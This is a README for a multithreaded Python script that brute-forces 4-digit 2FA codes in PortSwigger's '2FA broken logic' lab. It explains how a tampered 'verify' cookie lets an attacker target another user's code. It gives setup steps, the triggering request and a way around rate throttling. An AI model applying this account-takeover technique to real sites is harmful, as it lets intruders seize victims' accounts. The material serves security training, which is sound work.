# 2FA Brute Force - Broken Logic

A multithreaded Python script to brute-force a 4-digit MFA code by exploiting a logic flaw in 2FA verification.

## Vulnerability

Some websites verify the 2FA code using a `verify` cookie to determine which user's account is being accessed. The flaw is that the server does not check whether the `verify` cookie matches the session that completed step 1 of the login.

This means an attacker can:
1. Log in with their own credentials (step 1)
2. Change the `verify` cookie to the victim's username
3. Brute-force the victim's 2FA code without knowing their password

```
session=attacker_session  →  server accepts (step 1 completed)
verify=carlos             →  server checks code for carlos
code correct              →  logged in as carlos
```

## Why a Script Instead of Burp Suite Intruder?

Burp Suite Community Edition throttles Intruder to ~1 request per second. Brute-forcing a 4-digit code (0000-9999) at that speed would take nearly 3 hours.

A multithreaded Python script with 20 threads completes the same 10,000 requests in 1-2 minutes.

## How It Works

1. Generate a 2FA code for the victim by sending `GET /login2` with `verify=carlos`
2. Brute-force all combinations from `0000` to `9999` using 20 parallel threads
3. Each request sets `verify=carlos` in the cookie to target the victim's account
4. A `302` redirect response means the code is valid

## Usage

1. Navigate to the script directory:
```bash
cd portswigger/2fa-broken-logic
```

2. Install dependencies:
```bash
pip install requests
```

3. Edit the config at the top of `brute_2fa.py`:
```python
TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
SESSION_COOKIE = "YOUR_SESSION_COOKIE"
VERIFY_USER = "carlos"
THREADS = 20
```

4. First, generate a 2FA code for the victim — send this request in Burp Repeater:
```
GET /login2 HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: verify=carlos; session=YOUR_SESSION_COOKIE
```

5. Run the script:
```bash
python3 brute_2fa.py
```

6. Once the code is found, go to `/my-account` in the browser using your session cookie.

## Target

This script was written for the PortSwigger Web Security Academy lab:
**"2FA broken logic"**

> For educational purposes only. Only use against systems you have explicit permission to test.

## Requirements

- Python 3.10+
- requests